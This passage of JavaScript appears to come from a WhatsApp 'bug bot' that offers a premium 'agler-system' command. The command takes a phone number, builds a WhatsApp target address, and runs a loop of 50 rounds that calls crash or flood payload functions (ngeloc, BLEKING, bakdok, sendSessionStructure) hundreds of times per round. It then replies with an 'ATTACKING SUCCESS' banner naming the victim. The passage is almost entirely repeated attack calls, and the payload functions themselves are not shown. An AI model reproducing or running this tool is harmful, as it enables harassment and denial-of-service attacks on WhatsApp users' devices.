await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
}
reply(`「 𒈒𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒✔ 」
  🎃⃟𒆜𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫×⃟🎃
│──▄────▄▄▄▄▄▄▄────▄───│
│─▀▀▄─▄█████████▄─▄▀▀──│
│─────██─▀███▀─██──────│
│───▄─▀████▀████▀─▄────│
│─▀█────██▀█▀██────█▀──│
│༂ 𝐀𝐓𝐓𝐀𝐂𝐊 𝐓𝐎 : ${target} ༂         
│༂ 𝐓𝐘𝐏𝐄 𝐁𝐔𝐆 : ${command} ༂
│𝐒𝐜𝐫𝐢𝐩𝐭 𝐓𝐨 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 3.0,
│𝐣𝐚𝐧𝐠𝐚𝐧 𝐦𝐞𝐧𝐠𝐮𝐣𝐢 𝐤𝐞𝐩𝐚𝐝𝐚 
│𝐨𝐫𝐚𝐧𝐠 𝐲𝐚𝐧𝐠 𝐠𝐚𝐤 𝐚𝐝𝐚 𝐬𝐚𝐥𝐚𝐡
╚─────「 𝐁𝐮𝐠🎃⃟𒆜𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫×⃟🎃𝐆𝐚𝐜𝐨𝐫🤩」──`)
break

case 'agler-system': case 'agler-system': case 'agler-forger':
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 50; i++) {
await sendSessionStructure(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
